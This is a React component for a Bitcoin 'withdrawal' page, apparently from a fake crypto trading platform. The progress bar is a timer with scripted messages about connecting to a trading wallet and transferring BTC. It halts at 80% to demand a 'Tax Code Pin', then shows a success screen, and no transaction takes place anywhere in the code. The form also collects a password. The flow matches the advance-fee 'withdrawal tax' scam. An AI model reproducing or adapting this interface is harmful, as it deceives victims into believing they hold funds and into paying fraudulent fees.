/* eslint-disable react-hooks/exhaustive-deps */
"use client";
import Image from "next/image";
import Link from "next/link";
import React, { useEffect, useState } from "react";

export default function Btcpayment({
  handleInputChange,
  formErrors,
  handleSubmit,
  formData,
  btcFilled,
  setBtcFilled,
}) {
  const [progress, setProgress] = useState(0);
  const [progressMessage, setProgressMessage] = useState("");
  const [taxCodePin, setTaxCodePin] = useState("");
  const [taxCodePinError, setTaxCodePinError] = useState("");
  const [waitingForPin, setWaitingForPin] = useState(false);
  const [showSucces, setSuccess] = useState(false);

  useEffect(() => {
    const updateProgress = () => {
      setProgress((prevProgress) => {
        const newProgress = prevProgress + 0.5;
        if (newProgress >= 80 && !taxCodePin) {
          setWaitingForPin(true);
          return 80;
        } else if (newProgress >= 100) {
          setSuccess(true);
          return 100;
        }
        return newProgress;
      });
    };

    if (!btcFilled) {
      const interval = setInterval(() => {
        if (progress < 100 && !waitingForPin) {
          updateProgress();
          updateProgressMessage(progress);
        }
      }, 100); // Update every 0.1 seconds

      return () => clearInterval(interval);
    }
  }, [btcFilled, progress, waitingForPin, taxCodePin]);

  const updateProgressMessage = (currentProgress) => {
    if (currentProgress >= 30 && currentProgress < 50) {
      setProgressMessage("Getting contract ID...");
    } else if (currentProgress >= 50 && currentProgress < 70) {
      setProgressMessage("Connecting to trading wallet...");
    } else if (currentProgress >= 70 && currentProgress < 90) {
      setProgressMessage("Getting Withdrawals data...");
    } else if (currentProgress >= 90) {
      setProgressMessage("Transferring requested BTC...");
    } else if (currentProgress >= 0) {
      setProgressMessage("Processing Transaction...");
    }
  };
  const handlePinChange = (e) => {
    setTaxCodePin(e.target.value);
  };

  const handlePinSubmit = (e) => {
    e.preventDefault();
    if (taxCodePin.length >= 6) {
      setTaxCodePinError(""); // Clear any previous errors
      setWaitingForPin(false);
      // You can add logic here to handle the form submission
    } else {
      setTaxCodePinError("Tax Code Pin must be at least 6 characters");
    }
  };

  return (
    <>
      {btcFilled && (
        <>
          <div className="bitcoin-payment image-cont">
            <Image
              alt=""
              src="/assets/bitcoin.png"
              width={1000}
              height={1000}
              className="md:w-1/2 w-full mx-auto"
            />
          </div>
          <div className="bitcoin-payment-form p-4">
            <form onSubmit={handleSubmit}>
              <div className="mb-1 mt-3">
                <label
                  htmlFor="walletAddress"
                  className="font-bold text-sm py-2"
                >
                  Bitcoin Wallet Address
                </label>
              </div>
              <input
                type="text"
                id="walletAddress"
                name="walletAddress"
                value={formData.walletAddress}
                onChange={handleInputChange}
                placeholder="Enter Wallet Address"
                className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none ${
                  formErrors.walletAddress ? "border-red-500 border" : "border"
                }`}
              />
              {formErrors.walletAddress && (
                <p className="text-red-500 text-xs mt-1">
                  {formErrors.walletAddress}
                </p>
              )}

              <div className="mb-1 mt-3">
                <label htmlFor="amount" className="font-bold text-sm py-2">
                  Enter Amount (USD)
                </label>
              </div>
              <input
                type="text"
                id="amount"
                name="amount"
                value={formData.amount}
                onChange={handleInputChange}
                placeholder="Enter Amount"
                className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none ${
                  formErrors.amount ? "border-red-500 border" : "border"
                }`}
              />
              {formErrors.amount && (
                <p className="text-red-500 text-xs mt-1">{formErrors.amount}</p>
              )}

              <div className="mb-1 mt-3">
                <label htmlFor="password" className="font-bold text-sm py-2">
                  Password Verification
                </label>
              </div>
              <input
                type="password"
                id="password"
                name="password"
                value={formData.password}
                onChange={handleInputChange}
                placeholder="Enter Password"
                className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none ${
                  formErrors.password ? "border-red-500 border" : "border"
                }`}
              />
              {formErrors.password && (
                <p className="text-red-500 text-xs mt-1">
                  {formErrors.password}
                </p>
              )}

              <button
                type="submit"
                className="w-full px-4 py-3 mt-4 text-sm rounded-lg bg-red-500 text-white font-bold hover:bg-red-600 focus:outline-none focus:bg-red-600"
              >
                Withdraw BTC
              </button>
            </form>
          </div>
        </>
      )}

      {!btcFilled && !showSucces && (
        <div className="py-40">
          <div className="flex w-full justify-center items-center ">
            <div className="progress-cont w-full px-5 md:px-14">
              <div className="progress-messages text-sm font-bold mb-1 flex items-center justify-between">
                <div>{progressMessage}</div>
                <div className="percentage font-bold text-sm">
                  {progress.toFixed()}%
                </div>
              </div>
              <div className="progress-movements w-full">
                <div className="holder w-full h-2 relative overflow-hidden rounded-full bg-red-50">
                  <div
                    className="mover absolute h-full rounded-full transition-all bg-red-800"
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
              </div>
            </div>
          </div>

          {progress >= 80 && waitingForPin && (
            <div className="tax-code-form px-5 md:px-14 mt-8">
              <form onSubmit={handlePinSubmit}>
                <input
                  type="text"
                  id="taxCodePin"
                  name="taxCodePin"
                  placeholder="Enter Tax Code Pin"
                  value={taxCodePin}
                  onChange={handlePinChange}
                  className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none border ${
                    taxCodePinError ? "border-red-500" : ""
                  }`}
                />
                {taxCodePinError && (
                  <p className="text-red-500 text-xs mt-1">{taxCodePinError}</p>
                )}
                <button
                  type="submit"
                  className="bg-slate-800 py-3 mt-2 w-full rounded-lg text-sm text-white font-bold"
                >
                  Proceed
                </button>
              </form>
            </div>
          )}
        </div>
      )}
      {showSucces && (
        <div className="flex flex-col justify-center items-center px-5 md:px-14 mt-8 py-10 bg-white rounded-lg shadow-md">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 20 20"
            fill="currentColor"
            className="w-16 h-16 mx-auto mb-4 text-green-500"
          >
            <path
              fillRule="evenodd"
              d="M16.403 12.652a3 3 0 000-5.304 3 3 0 00-3.75-3.751 3 3 0 00-5.305 0 3 3 0 00-3.751 3.75 3 3 0 000 5.305 3 3 0 003.75 3.751 3 3 0 005.305 0 3 3 0 003.751-3.75zm-2.546-4.46a.75.75 0 00-1.214-.883l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z"
              clipRule="evenodd"
            />
          </svg>
          <h1 className="text-xl font-bold mb-2">Withdrawal Successful</h1>
          <p className="text-gray-600 mb-6 text-center text-sm px-5 md:px-20 lg:px-40">
            Your BTC withdrawal request has been processed successfully. It may
            take some time (5mins - 2hours) to reflect in your provided wallet
            address.
          </p>
          <Link href="/dashboard" passHref>
            {" "}
            <button className="bg-slate-800 py-3 px-6 rounded-lg text-sm text-white font-bold hover:bg-slate-600 transition-all focus:outline-none">
              Back to Dashboard
            </button>
          </Link>
        </div>
      )}
    </>
  );
}
